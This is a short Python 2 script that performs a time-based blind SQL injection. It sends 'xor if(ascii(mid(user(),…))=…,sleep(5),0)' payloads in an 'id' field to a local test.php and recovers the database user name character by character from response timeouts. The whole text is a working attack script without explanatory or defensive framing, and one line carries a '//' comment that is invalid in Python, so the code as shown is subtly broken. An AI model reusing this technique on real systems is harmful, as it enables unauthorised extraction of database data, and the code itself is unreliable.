#!/usr/bin/env python
#encoding: utf-8
import urllib
import urllib2
import time

payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'
header = {'User-Agent': 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'}
values = {}
print 'Start to retrive user:'
user = ''

for i in range(1, 20):
    for payload in payloads:
        try:
            values['id'] = "1 xor if(ascii(mid(user(),%s,1))=%s,sleep(5),0)" % (i, ord(payload))
            data = urllib.urlencode(values)
            url = "http://127.0.0.1/test.php"   //测试网址
            request = urllib2.Request(url, data, headers=header)
            response = urllib2.urlopen(request, timeout=5)
            result = response.read()
            print '.',
        except:
            user += payload
            print '\n[in progress]', user
            time.sleep(3.0)
            break